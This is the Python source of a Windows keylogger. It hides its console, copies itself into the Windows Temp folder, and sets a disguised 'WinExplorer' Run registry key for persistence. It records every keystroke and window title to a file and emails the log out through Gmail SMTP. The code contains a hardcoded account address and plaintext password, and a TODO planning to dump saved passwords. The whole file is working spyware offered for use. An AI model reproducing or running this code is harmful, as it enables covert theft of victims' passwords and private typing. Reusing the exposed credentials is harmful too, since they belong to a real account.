import pyHook
import pythoncom
import random
import smtplib
import os
import shutil
from _winreg import *
import win32event, win32api, winerror
import threading
import sys
#import subprocess

#TODO:
#THREADING TO THE MAILER   GOT AROUND
#DEBUG THE MAILER(MISSING INT IN SMTP()) GOT ARROUND         
#FIND OUT HOW PY2EXE WORKS  DONE
#????
#PROFIT

#FUTURE ADDINGS:
#   DUMP SAVED PASSWORDS


#Disallowing Multiple instances
#mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
#if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
#    mutex = None
#    print "Multiple Instance not Allowed"
#    sys.exit(0)


cache=""
filename=""
count=0
window=""

def main():
    hide()
    exeCheck()
    fileCheck()

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


def exeCheck():
    cwd=os.path.dirname(os.path.realpath(sys.argv[0]))
    if cwd == "C:\WINDOWS\Temp":return True
    else:
        #create the exe in the Temp folder and add a key to the register
        for i in os.listdir('C:\\WINDOWS\\Temp'):
            if len(i)==10 and i[-4:]==".exe" and i[:2]=="ms":
                #then the program already exists and this is a 2nd instance
                sys.exit()
        else:
            new_file="C:\\WINDOWS\\Temp\\ms"+"".join(random.choice(['0','1','2','3','4','5','6','7','8','9']) for i in xrange(4))+".exe"
            shutil.copyfile(sys.argv[0],new_file)
            key_val= r'Software\Microsoft\Windows\CurrentVersion\Run'
            key2change= OpenKey(HKEY_CURRENT_USER,key_val,0,KEY_ALL_ACCESS)
            SetValueEx(key2change, "WinExplorer",0,REG_SZ, new_file)
            os.startfile(new_file)
            sys.exit()
def fileCheck():
    global filename
    for i in os.listdir("C:\\WINDOWS\\Temp"):
        if len(i)==11 and i[-4:]==".bak" and i[:3]=="win":
            filename="C:\\WINDOWS\\Temp\\" + i
            mailer()
            return True
    else:
        filename="C:\\WINDOWS\\Temp\\"+"win"+"".join(random.choice(['0','1','2','3','4','5','6','7','8','9']) for i in xrange(4))+".bak"
        return True
    
def writer(cache):
    global filename
    target=open(filename,'a')
    target.write(cache+"\n")
    target.close()
    return True

def mailer():
    global filename
    #mail the the content
    USER="jgmalheiross@gmail.com"
    PASS="apto1004"
    TO ="jgmalheiross@gmail.com"
    SUBJECT="DATA"
    data=""
    f=open(filename,'r')
    for line in f:
        data+=line
    f.close()
    message = """\
From: %s
To: %s
Subject: %s

%s
""" % (USER, TO, SUBJECT, data)

    server = smtplib.SMTP()
    server.connect("smtp.gmail.com",587)
    server.starttls()
    server.login(USER,PASS)
    server.sendmail(USER, TO, message)
    server.quit()
    return True

def keyPress(event):
    global count
    global cache
    global window
    key=""
    
    if event.WindowName != window:
        writer(cache)
        cache=''
        count=0
        writer("NEW WINDOW:"+event.WindowName)
        window=event.WindowName
        
    if event.Ascii == 0:key=="["+event.Key+"]"
    elif event.Ascii == 13:key="[ENTER]"
    elif event.Ascii == 9:key="[TAB]"
    elif event.Ascii == 8:key="[BACKSPACE]"
    else:key=chr(event.Ascii)
    cache+=key
    count+=1
    if count>=25:
        writer(cache)
        cache=''
        count=0
        
if __name__=="__main__":
    main()

#start the hook
k1=pyHook.HookManager()
k1.KeyDown =keyPress
k1.HookKeyboard()
pythoncom.PumpMessages()
